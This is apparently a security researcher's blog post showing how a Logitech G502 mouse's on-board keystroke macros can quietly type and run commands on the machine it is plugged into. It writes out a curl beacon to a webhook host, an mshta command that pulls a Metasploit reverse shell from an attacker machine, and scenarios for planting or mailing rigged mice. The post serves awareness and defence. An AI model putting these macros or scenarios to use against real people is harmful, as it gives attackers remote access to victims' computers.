---
title: Weaponizing a Logitech mouse
layout: post
permalink: /weaponizing-a-logitech-mouse
---

<img align="right" src="/assets/mousehack/images/intro.png">

# Introduction
This is a demonstrative research on how one of the most essential, daily used devices - the computer mouse, can be weaponized into a delivery method for exploits to unsuspecting victims.

In times when (most) people are going crazy about electronic devices and technology, the market for more advanced computer peripherals is also growing. Whether it's tailored for gamers or businesses, nowadays almost every new mouse (or other device) model has an ergonomic shape, RGB lights, numerous programmable buttons and most importantly - memory.

As security professionals, we are constantly raising the awareness on the dangers of technology and the internet to our colleagues, friends and family, (hopefully) stopping them from plugging in a USB drive they found on the street into their computers.

At the same time, we are not putting nearly enough (or any) scrutiny when it comes to the computer mouse. It's not only one of the oldest (and most convenient) ways of interacting with the computer, especially for the normal non-technical user, it is almost intrinsically trusted.

Nowadays it comes with shiny lights and many many buttons, further sparking the natural human curiosity of "what does this button do?" that we all share. Read on to see what the buttons can do and how this could be easily exploited.

# How it started

The idea for this research was born when I was sitting in the IT support room, waiting for an administrator to fix/install some programs on my company laptop, when I overheard another support member saying on a call:

_"No, USBs are blocked, we provide only a mouse, keyboard and headset to employees"._

As the good security practices dictate - USB ports were monitored and drives were blocked to prevent employees copying company data or infecting their machines. This topic was so regularly explained/taught by the security team and likewise tested by new employees trying upload/download files, it was commonly understood that "USBs" meant drives in this context. 

Even though I've heard this sentence a thousand times, hearing it again sparked an interesting thought - USB ports are technically not blocked/disabled, the same peripherals that IT provide are still using USB cables/dongles to connect to the laptops. How come they are "trusted"?

Back at home, I recalled that in the past couple of years, several famous E-sports players were caught cheating via... mouse macros. Mice macros are sequences of actions (commands, key or mouse presses and movements) that can help you automate tedious tasks which you can assign to a button on the mouse. For instance you can assign your email address to a button, so instead of typing it often you can just click a button and it is typed for you.

When attending e-sports competitions, teams/players get the same computers and monitors to avoid any performance differences, however, they bring their own peripherals because they are used to them, same as a tennis player having their own custom racket. Unfortunately, some of the e-sports stars brought along macros that gave them an unfair advantage over other players - subtly pointing them in the direction of an enemy player (even through walls), reducing the recoil on their guns or helping them aim directly on target.

If cheaters could achieve keeping their cross-hair on their enemies in a fast paced game, then surely these macros are powerful enough to be used for other purposes. This gave an answer to my question - no, peripheral devices should not be trusted and are just as suspicious as any other device.

# Setup

Nowhere near e-sport events, I am a happy owner of one of the most popular family of gaming mice, the Logitech G502, which has an on-board memory that can store up to 5 profiles - with sensitivity, button assignments, lightning settings and most importantly macros. The on-board memory provides the convenience that once you setup your mouse the way you like it, you can connect it to any computer and all of your settings will remain the same, since they are stored on the mouse itself. 
Throughout this research will would be focusing on this particular Logitech model, but there are numerous other companies providing a variety of models full of features with prices ranging from just $10 - $15 up to a few hundred.

In the Logitech mice world there are multiple ways to create macros as you will see below, however only one type can be saved on the on-board memory - recorded keystrokes, at least for now. In recent versions Logitech even brought back Lua scripting macros which weren't available for a while. Unfortunately they require a Lua virtual machine which runs as part of the Logitech mouse driver/G HUB Software. With that in mind we will be focusing on recorded keystrokes throughout the rest of this article.

Managing all of the features and settings of a Logitech mouse is done via the Logitech G HUB software (Available on Windows and Mac only). After installing, starting the program and connecting a Logitech mouse we are greeted by the following screen:

![](/assets/mousehack/images/curl_macro.png)

## Creating a macro

Skipping most of the options, we will jump straight to the interesting part - the macros, profiles and memory. To access the Profiles menu we navigate to the "Manage profiles" menu.

![](/assets/mousehack/images/lghub_manage_profiles.png)

In order to create a macro, from the "Manage profiles" menu we go to "Macros" and "Add macro for the selected app" (in this case the Desktop a.k.a default app) to access the user interface option.

![](/assets/mousehack/images/lghub_macros.png)

![](/assets/mousehack/images/lghub_name_this_macro.png)

We give the macro a name:

![](/assets/mousehack/images/lghub_macro_options.png)

We have 4 options, for simplicity we will choose the simplest one "No repeat" to just execute once.

![](/assets/mousehack/images/lghub_macro_main_screen.png)
Upon clicking the "Start now" button we are provided several options:

![](/assets/mousehack/images/lghub_macro_start_now_optilons.png)

There are several convenient ways for creating macros, but as mentioned only the "Record keystrokes" could be stored in the on-board memory at the time of writing.
Note: This is ongoing for at least two/three years so not much hope of being able to store other macros unless Logitech make some changes in the future. The case could be different in other vendors and models.

Choosing the "Record keystrokes" macro type puts us in recording mode and as soon as we start pressing keys we see the following symbols popping up:

![](/assets/mousehack/images/lghub_recording_keystrokes.png)

![](/assets/mousehack/images/lghub_recording_keystrokes.png)

After we are done we press "Stop recording" and now we have a recorded macro.

![](/assets/mousehack/images/lghub_stop_recording_keystrokes.png)

As you can see from the screenshots, we typed "hello friend" but each character is present twice - notice the arrows pointing Up and Down, these indicate the "Key down" and "Key up" events respectively for each keystroke. Also, the standard delay option is enabled by default and set to 50 ms, which means there is a 50 millisecond delay between each event.

Once we save the macro, we need to assign it to a button to trigger it. We can navigate to the "Assignments" menu, select Macros and drag and drop our macro to a button of our choice.

![](/assets/mousehack/images/lghub_assign_macro.png)

We can now open a text editor and click the assigned button to see our macro in action:

![](/assets/mousehack/images/hello_friend_demo.gif)

As you can see the macro works, however it is "typing" rather slow. We can speed up things by going to the macro screen and disabling the "Use standard delays" checkbox. This adds another element to the interface, showing the actual delay between our keystrokes when we were recording them. We can delete the delay between each key down and key up event for each respective keystroke and manually set a delay between each pair to 1 ms to increase the overall "typing" speed.

![](/assets/mousehack/images/lghub_minimal_delay.png)

With the minimum delay our macro is way faster, almost instant:

![](/assets/mousehack/images/hello_friend_demo_optimized.gif)


## Saving a macro/profile

In order to fully demonstrate the delivery method we need to save the mouse profile in the on-board memory. To do so we go back to the main menu and click the chipset icon that says "On-board Memory Mode: Off" to turn it on.
Note: This procedure will be repeated after each new macro or modification.

<video src="/assets/mousehack/videos/lghub_save_profile.mp4" type="video/mp4" width="100%" controls></video>

# Demonstration

The main topic of this research is not AV evasion, endpoint detection, lets mess around with Windows defender. The focus is on showing that we are used to put USB drives and keyboards under suspicion, while leaving out an equally relevant device and attack vector - the mouse.

With that said, the following examples are not focused on special payloads that remain undetected by latest version of AVs, but to show how easy it is to setup an over the shelf device to gain access to a victim's machine with a simple enough user interface. The limits on what can be achieved depend on multiple factors such as the target system, installed software & security controls, but the potential is huge.

## Curl demo

Let's create a new macro that makes a call to an external webhook website with the curl command:

![](/assets/mousehack/images/curl_macro.png)

Note: The "Show key down/key up" checkbox is disabled to make the macro more readable.

Breakdown of the macro:
{% highlight bash %}

Win + R  # Shortcut to open the Run program
cmd /C   # Invoke command prompt and pass a command to it
curl https://webhook.site/103ee47d-7ac7-49aa-98ac-e74b4fb2bd02 # The curl call
Enter    # to execute
{%endhighlight%}

Once again we can play around with the delay between keystrokes to speed the macro (note the 25ms between invoking "Run" and curl, this is to give enough time to actually open the Run dialog before typing):

![](/assets/mousehack/images/curl_macro_optimized.png)

As before, we save the macro, enable on-board memory and replace the default profile. Next, quit the Logitech G Hub, to ensure that the macro is executed from memory. In addition, we have the webhook site on the right site to see the request from the target machine:

<video src="/assets/mousehack/videos/curl_demo.mp4" type="video/mp4" width="100%" controls></video>

As you can see, with the delay optimization executing the macro is almost instant and the user can (maybe) only notice one or two flashing windows that close immediately. An unsuspecting user could think that the OS is still installing drivers for the mouse.

Modifying the payload for Linux, replacing "Win + R" for "Alt + F2" and we see that on Ubuntu it's almost identical;

<video src="/assets/mousehack/videos/curl_demo_ubuntu.mp4" type="video/mp4" width="100%" controls></video>

## Reverse shell 

We will use a fairly short payload using a well known exploit in Metasploit. As you will see it gets caught by Windows Defender and is not executed. For demonstration purposes we will disable Windows Defender in a second demo. Once again, this article is about a mouse being a viable method of delivering exploits, not about bypassing Defender and other controls.

We are using two machines in a local network - the victim Windows machine and an attacker Kali machine.

We are setting our macro to:

{% highlight cmd %}
mshta.exe http://192.168.56.102:8080/
{% endhighlight %}

![](/assets/mousehack/images/shell_macro.png)

Since this is a fairly known attack, Windows Defender which is enabled by default catches it and prevents the execution:

<video src="/assets/mousehack/videos/defender_demo.mp4" type="video/mp4" width="100%" controls></video>

After disabling live protection, we can see the full attack. Notice that in both demos, the user could see only a very brief flashing window before the attacker gets access to their machine.

<video src="/assets/mousehack/videos/defender_disabled_demo.mp4" type="video/mp4" width="100%" controls></video>


## Qubes OS

Qubes OS is "a reasonably secure operating system", focusing on security and privacy, used by whistle-blowers, journalists and privacy and security enthusiasts. It is designed (at least for now) to be used on a laptop where you use the built-in keyboard and trackpad which are essentially trusted. 

During the installation and initial setup there is an option to "Automatically trust USB mice (discouraged)" that is not enabled. For demo purposes I am running Qubes OS in a virtual machine which could be the reason why leaving this option disabled doesn't seem to stop our malicious mouse from being used as you can see:

<video src="/assets/mousehack/videos/qubes_os_demo.mp4" type="video/mp4" width="100%" controls></video>
Note: The "r" in "rcurl" comes from the Windows tailored payload starting with Win + R. Since there is no Win button modifier in Qubes, the "r" is treated as a normal character.

Our two payloads are still being loaded from the on-board memory and typed successfully even in the "dom0" which is the administrative part of Qubes. Further testing on bare metal is needed to fully confirm the functionality. 

However, the mere fact that you will see some scrutiny/controls and warnings that a USB mouse could be a threat ONLY if you use a specialized security and privacy oriented OS for highly advanced users speaks for itself. Once again, only a small percent of people are viewing one of most used peripheral as an attack vector.

# Possible attack scenarios & summary

Now that we've seen macros in action and a glimpse of what could be achieved with them, here are a few "hypothetical" attack scenarios:

1. Placing a "brand-new" mouse in/around an office - depending on the physical security of a corporation gaining access to a machine could be as easy as pretending to go to an interview, tailgate an employee, act as a delivery man, etc. All you would need is to leave a weaponized mouse with/without it's package and wait for an unsuspecting victim to decide to test it out. Hell, you may even "accidentally drop" it anywhere on/around the premises - in a waiting room, hallway, elevator.
2. Send a branded "company" mouse to a target employee - all you would need is the destination address and to impersonate an HR/company representative. Where I leave, you can fill in the sender details however you like, as long as you pay the delivery - they don't care or ask for ID.
3. Replacing a target/colleague's mouse with the same model - nowadays not only gaming mice have RGB, multiple buttons and memory, there are many "business class" models out there. With the increase in popularity of more complex mice, this attack could be as easy as buying the same model as your target and having brief access to swap them.

# Conclusion 
Given how "trusted" mice are by both humans and technology, and the fact that they come in sexier packages, we as security professionals should start paying more attention to how we provision each device for our homes and for our employees. We have numerous controls and expensive tools to protect us from RATs (remote access trojan), we have almost nothing against mice. *I will walk myself out.*

# References:

hxxps[://]www[.]theverge[.]com/2018/6/26/17506656/dota-2-ti8-disqualified-esports-mouse-macros-thunder-predator
hxxps[://]technode[.]com/2019/11/07/chinas-online-gaming-cheats-turn-to-hardware-to-evade-detection/
hxxps[://]www[.]qubes-os[.]org/intro/
hxxps[://]www[.]emergenresearch[.]com/industry-report/gaming-mouse-market
